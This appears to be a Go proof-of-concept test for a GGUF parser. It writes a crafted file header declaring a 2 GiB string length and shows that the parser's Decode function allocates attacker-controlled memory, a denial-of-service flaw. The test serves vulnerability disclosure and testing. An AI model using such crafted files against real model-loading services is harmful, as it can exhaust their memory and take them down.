package ggml

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"testing"
)

// TestPocUnboundedStringAlloc demonstrates that readGGUFString performs an
// attacker-controlled allocation before reading the string bytes.
func TestPocUnboundedStringAlloc(t *testing.T) {
	var mem1, mem2 runtime.MemStats
	runtime.ReadMemStats(&mem1)
	fmt.Printf("Before: HeapAlloc=%d MiB Sys=%d MiB\n", mem1.HeapAlloc>>20, mem1.Sys>>20)

	var buf bytes.Buffer

	binary.Write(&buf, binary.LittleEndian, uint32(0x46554747)) // magic
	binary.Write(&buf, binary.LittleEndian, uint32(3))          // version
	binary.Write(&buf, binary.LittleEndian, uint64(0))          // numTensor
	binary.Write(&buf, binary.LittleEndian, uint64(1))          // numKV

	maliciousLen := uint64(2 << 30) // 2 GiB attacker-declared string length
	fmt.Printf("Declared string length: %d MiB\n", maliciousLen>>20)
	binary.Write(&buf, binary.LittleEndian, maliciousLen)

	buf.WriteString("hi")
	fmt.Printf("Blob size: %d bytes\n", buf.Len())

	tmp, err := os.CreateTemp("", "gguf-poc-*.bin")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmp.Name())
	tmp.Write(buf.Bytes())
	tmp.Seek(0, 0)

	defer func() {
		if r := recover(); r != nil {
			runtime.ReadMemStats(&mem2)
			fmt.Printf("PANIC RECOVERED: %v\n", r)
			fmt.Printf("After panic: Sys=%d MiB (delta=%d MiB)\n",
				mem2.Sys>>20, (mem2.Sys-mem1.Sys)>>20)
		}
	}()

	fmt.Println("Calling Decode...")
	_, err = Decode(tmp, -1)
	fmt.Printf("Decode returned err=%v\n", err)

	runtime.ReadMemStats(&mem2)
	fmt.Printf("After: HeapAlloc=%d MiB Sys=%d MiB (delta sys=%d MiB)\n",
		mem2.HeapAlloc>>20, mem2.Sys>>20, (mem2.Sys-mem1.Sys)>>20)
}
